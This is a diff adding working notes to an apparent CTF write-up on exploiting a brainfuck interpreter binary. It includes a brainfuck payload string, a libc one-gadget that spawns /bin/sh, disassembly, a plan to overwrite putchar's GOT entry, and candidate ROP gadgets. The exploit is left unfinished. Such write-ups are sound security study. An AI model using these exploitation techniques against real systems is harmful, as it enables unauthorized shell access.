@@ -52,3 +52,33 @@ Note:
 
 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>..>.>.>.,
+
+
+We have an interesting gadget:
+0x5fbd5 execl("/bin/sh", eax)
+constraints:
+  esi is the GOT address of libc
+  eax == NULL
+
+We need to use this gadget to get our shell.
+
+We can get eax to NULL using the putchar functionality.
+do_brainfuck+5E   mov     eax, ds:p
+do_brainfuck+63   movzx   eax, byte ptr [eax] ; Move with Zero-Extend
+do_brainfuck+66   movsx   eax, al         ; Move with Sign-Extend
+do_brainfuck+69   mov     [esp], eax
+do_brainfuck+6C   call    _putchar
+
+Just make p point to 0 and overwrite the got address of putchar with our gadget.
+
+Now we need to figure out how to set the esi to the address of the got.
+
+The modification of esi register might require another gadget but im not sure about that.
+There might be an easier way to do that.
+
+
+Some potential gadgets:
+
+0x00176951 : inc esi ; or ebp, dword ptr [ebp + 0xa] ; ret
+0x0018fe7c : inc esi ; or ebp, dword ptr [ebx + 0xa] ; ret
+
